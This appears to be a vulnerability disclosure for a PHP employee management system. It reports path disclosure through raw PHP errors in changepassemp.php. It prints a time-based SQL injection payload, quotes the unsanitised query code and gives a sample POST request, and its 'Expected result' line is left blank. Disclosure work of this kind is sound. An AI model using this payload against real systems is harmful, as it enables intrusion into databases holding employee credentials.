## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/changepassemp.php` contains an Information Disclosure vulnerability (verbose PHP error / path disclosure)

Impact of the vulnerability
When unexpected input causes a database query failure, the application returns raw PHP warnings to the client. This discloses internal file system paths and source code line numbers, which can help attackers:

- Map server directory structure and deployed environment
- Identify vulnerable files and exact code locations
- Assist exploitation of other vulnerabilities (SQLi/XSS/LFI, etc.)

### Payload:

(select*from(select+sleep(5)union/**/select+1)a)

```
(select*from(select+sleep(5)union/**/select+1)a)
```

### POC:

`changepassemp.php` performs a database query using user-supplied `id` and then calls `mysqli_fetch_assoc()` without checking whether the query succeeded:

  $result = mysqli_query($conn, "select employee.password from employee WHERE id = $id");

​     $employee = mysqli_fetch_assoc($result);

​          if($old == $employee['password']){

Send a request that provides an invalid/non-numeric `id` value (example shown with a generic invalid value):

POST /changepassemp.php HTTP/1.1

Host: 370project:82

Content-Type: application/x-www-form-urlencoded

Connection: close

id=<INVALID_VALUE>&oldpass=test&newpass=test&update=

Expected result:

This confirms path disclosure and improper error handling.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409155915172](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409155915172.png)